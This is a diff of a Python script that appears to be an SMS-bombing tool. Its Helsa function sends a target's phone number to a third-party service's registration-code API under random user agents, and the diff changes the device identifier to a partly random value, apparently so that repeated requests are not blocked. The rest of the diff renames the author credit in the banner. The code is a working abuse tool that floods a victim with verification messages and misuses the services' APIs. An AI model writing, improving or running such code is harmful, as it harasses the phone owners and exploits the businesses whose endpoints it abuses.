@@ -1,7 +1,6 @@
 #in the name of God
 #Coded By Sardar Cybery
 #A D O R TM
-#Library
 import os
 import sys
 import time
@@ -121,9 +120,10 @@ def Taghche(Number):
 def Helsa(Number):
     HelsaH = {"user-agent":random.choice(User)}
     HelsaC = {"mobileNumber":"0"+Number}
+    HelsaN = ("0"+Number)
     try:
         time.sleep(2)
-        HelsaS = requests.post(f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{Number}&deviceId=25010064645373610205005635373610201245305768136624&discountCode=&utm_content=&utm_source=&utm_campain=",headers=HelsaH,json=HelsaC)
+        HelsaS = requests.post(f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={HelsaN}&deviceId=25010064645373610205{str(random.randint(10,99))}5635373610201245305768136624&discountCode=&utm_content=&utm_source=&utm_campain=",headers=HelsaH,json=HelsaC)
         if HelsaS.ok == True:
             print(Coloresh.GREEN+"Send :)")
         else:
@@ -154,7 +154,7 @@ def Panel():
     
     ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||
                 
-             ''' + Coloresh.CYAN + "Coded " + Coloresh.LIGHTMAGENTA_EX + "By " + Coloresh.YELLOW + '''Null :) ''' + Coloresh.BLUE + '''
+             ''' + Coloresh.CYAN + "Coded " + Coloresh.LIGHTMAGENTA_EX + "By " + Coloresh.YELLOW + '''Sardar Cyberym :) ''' + Coloresh.BLUE + '''
     
 
 
@@ -226,5 +226,4 @@ def Attack():
 #Run
 Panel()
 
-#Coded By Sardar Cybery
 #A D O R TM
